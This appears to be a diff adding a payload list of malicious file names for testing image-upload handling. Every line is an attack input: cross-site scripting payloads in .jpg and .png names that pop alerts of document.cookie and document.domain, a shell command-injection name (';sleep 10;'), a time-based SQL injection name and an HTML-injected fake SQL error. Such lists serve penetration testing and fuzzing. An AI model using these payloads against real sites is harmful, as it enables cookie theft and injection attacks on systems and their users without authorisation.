@@ -1,0 +1,14 @@
+"><img src=x onerror=alert(1337)>.jpg
+"><img src=x onerror=alert(document.cookie)>.jpg
+"><img src=x onerror=prompt(document.cookie)>.jpg
+;sleep 10;.jpg
+<IFRAME SRC="javascript:alert(document.cookie);">.jpg
+<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;.jpg
+<img src=x onerror=alert(document.cookie)>.png
+<img src=x onerror=alert(document.domain)>.jpg
+<img src=x onerror=alert(document.domain)>.png
+<svg onload=alert(document.cookie)>.jpg
+<svg onload=alert(document.domain)>.jpg
+cookie.svg
+img-payloads.txt
+sleep(10)-- -.jpg
